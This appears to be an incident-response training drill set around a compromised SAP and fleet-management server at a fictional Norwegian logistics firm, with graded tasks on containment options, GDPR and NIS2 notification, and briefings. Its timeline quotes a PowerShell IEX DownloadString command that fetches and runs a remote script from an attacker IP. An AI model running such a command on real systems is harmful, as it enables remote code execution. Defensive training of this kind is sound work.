# Drill 02 — Containment Decisions Under Pressure

## Scenario

You are the IR lead at **NordicLogistics AS**, a Norwegian freight and logistics company with 3,200 employees and €890M annual revenue.
NordicLogistics operates a fleet management system, customer portal, and SAP ERP.

It is **Wednesday 14:30 CET**.
The following situation has unfolded over the past 90 minutes.

---

## Timeline

```text
13:00 — Help desk reports: 12 employees unable to log in to SAP ERP.
        IT suspects "an update" and opens a routine ticket.

13:15 — SAP admin notices unusual scheduled jobs running under
        service account "sap-batch-user". Escalates to security.

13:30 — You are engaged as IR lead. EDR shows:
        - sap-batch-user account running PowerShell scripts on SAP server
        - PowerShell executing: IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.156/stage2.ps1')
        - cmd.exe spawned from SAP application process (parent: sapstartsrv.exe)

13:45 — You check network logs:
        - Outbound connections from SAP server to 45.33.32.156:443 (Netherlands-based IP)
        - 2.3 GB transferred outbound over the past 6 hours (since 07:30 CET)
        - Active connection still open

14:00 — Fleet management system admin calls: "The trucks are showing wrong GPS
        coordinates. 3 long-haul trucks are showing location errors."
        Fleet system database is hosted on the same server as SAP (shared infrastructure).

14:15 — IT manager escalates: "Our primary backup server also appears to be connected
        to that external IP. Same outbound traffic pattern."

14:30 — CISO arrives. Decision required immediately.
```

---

## Your Tasks

### Task 1: Containment Decision Matrix (35 points)

For each of the following **five containment options**, evaluate the option and make a recommendation:

**Option A: Immediate full network isolation of the SAP/Fleet server**

* What is protected?
* What is the operational impact?
* What evidence is preserved or destroyed?
* Recommend: YES / NO / CONDITIONAL

**Option B: Block the external IP (45.33.32.156) at the firewall only**

* What is protected?
* What is the operational impact?
* What evidence is preserved or destroyed?
* Recommend: YES / NO / CONDITIONAL

**Option C: Kill only the active outbound connections (without full isolation)**

* What is protected?
* What is the operational impact?
* What evidence is preserved or destroyed?
* Recommend: YES / NO / CONDITIONAL

**Option D: Do nothing until forensic memory image is complete**

* What is protected?
* What is the operational impact?
* What evidence is preserved or destroyed?
* Recommend: YES / NO / CONDITIONAL

**Option E: Shut down the SAP/Fleet server completely**

* What is protected?
* What is the operational impact?
* What evidence is preserved or destroyed?
* Recommend: YES / NO / CONDITIONAL

---

### Task 2: Recommended Containment Sequence (25 points)

Based on your analysis, write a **step-by-step containment plan** covering the first 60 minutes from now (14:30–15:30 CET).
Include:

* What actions to take in what order
* Who executes each action (you / IT / CISO / Legal)
* What to do about the fleet management system
* What to do about the backup server
* What evidence to capture before each containment action

---

### Task 3: GDPR and NIS2 Assessment (20 points)

NordicLogistics processes:

* Customer shipping data (names, addresses, shipment contents) — personal data under GDPR
* Employee data in SAP HR module
* Norway is an EEA member (GDPR applies via EEA Agreement)
* NordicLogistics qualifies as an **essential entity** under NIS2 (transport sector)

Answer:

1. Has a personal data breach occurred? Justify.
1. Which supervisory authority must be notified? (Norway's DPA = Datatilsynet)
1. What is the GDPR notification deadline?
1. What are NordicLogistics' NIS2 obligations, and what are the notification timelines?
1. Are there any other regulatory obligations (e.g., sector-specific)?

---

### Task 4: Communication Drafts (20 points)

Write the following:

**A.
SBAR Brief to CISO** (verbal, 2-minute format — write out what you say)

**B.
Short message to the 12 employees** who reported SAP login issues this morning explaining why their access is suspended (without revealing full breach details)

---

## Hints

* The 6-hour data transfer window (07:30–13:30) predates your detection — what does this mean for the "data at risk" assessment?
* The fleet management system on the same server changes the operational calculus significantly
* PowerShell `IEX DownloadString` is a classic fileless malware loader — the payload is in memory
* The backup server connection is the most alarming development — why?
* Option A and Option E look similar but have very different forensic implications
* NIS2 transport sector entities have a 24-hour early warning obligation to ENISA/national authority
